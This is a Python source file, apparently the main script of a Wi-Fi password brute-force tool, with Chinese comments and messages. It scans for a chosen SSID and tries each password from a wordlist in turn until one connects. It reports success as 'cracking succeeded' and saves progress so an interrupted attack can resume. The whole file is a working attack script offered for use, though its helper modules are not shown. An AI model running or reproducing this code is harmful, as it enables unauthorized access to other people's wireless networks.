# --*--coding:utf-8--*--

__AUTHOR__ = "Master_LXJ"
__DOC__ = "The dream more than endlessly!"

from wifi import WiFi
from utils import *
import os


class Main(object):

    def __init__(self, ssid):
        """
        主类初始化
        :param ssid:
        """
        self.wifi = WiFi()
        self.wifi.StartScan(ssid)

    def choose(self, ssid):
        """
        选择WiFi
        :param ssid:
        :return:
        """
        results = self.wifi.GetScanResults()
        if len(results) > 0:
            self.wifi.choose_ap(results, ssid)

    def connect(self, passwords):
        """
        连接
        :param passwords:
        :return:
        """
        for index, p in enumerate(passwords):
            s = "<index>{}</index>\t<password>{}</password>\n".format(index, p)
            write_status(s, "a")
            self.wifi.Connect(p)
            status = self.wifi.GetStatus()
            if status in [self.wifi.const.IFACE_CONNECTED]:
                loger("[+]"*10+"破解成功"+"[+]"*10+"\r")
                loger("密码为: {}\r".format(p))
                os.system("pause")
                break
            else:
                continue
        os.system("echo 很遗憾!未能成功爆破,换个字典再试试吧!")

def run(passwords=None, ssid=None):
    """
    运行逻辑
    :param passwords:
    :param ssid:
    :return:
    """
    wifiboom = Main(ssid)
    password = Password()
    wifiboom.choose(ssid)
    # if password.password_way in ["M","m",""]:
    if passwords is None:
        pass_file = password.ask_file()
        loger("- -" * 10 + "开始破解" + "- -" * 10)
        if os.path.isfile(str(pass_file)):
            s = "<PathFile>{}</PathFile>\n".format(pass_file)
            write_status(s, "w")
            passwords = password.get_passwords(pass_file)
        else:
            passwords = pass_file
        wifiboom.connect(passwords)
    else:
        loger("- -" * 10 + "继续上一次破解" + "- -" * 10)
        wifiboom.connect(passwords)
    # elif password.password_way in ["A","a"]:
    #     for password_list in map(password.get_passwords,pass_file):
    #             wifiboom.connect(password_list)

if __name__ == '__main__':
    try:
        start_string()
        log = check_log()
        if log is False:
            run()
        else:
            assert len(log)
            print("-"*100+"\n"+"[+]"*5+"检测到上次的爆破记录{} WIFI名称: {} 测试密码: {}".format(log[0], log[1], log[2])+"[+]"*5)
            check = input("请问是否继续上次爆破?(Y/N) :")
            if check in ["N", "n"]:
                run()
            elif check in ["Y", "y"]:
                status = read_status()
                if status is not None:
                    with open(status[0], "r") as f:
                        lines = f.readlines()
                        if status[2] in lines[status[1]]:
                            passwords = lines[status[1]:]
                            passwords = [(p.split())[0] for p in passwords]
                            run(passwords=passwords, ssid=log[1])
                        else:
                            print("-"*15+"遇到错误,将重新开始!"+"-"*15)
                            run()
                else:
                    print("-" * 15 + "遇到错误,将重新开始!" + "-" * 15)
                    run()
    except Exception as e:
        print("[-]"*10+"程序发生出错"+"[-]"*10)
    finally:
        os.system("pause")
        exit()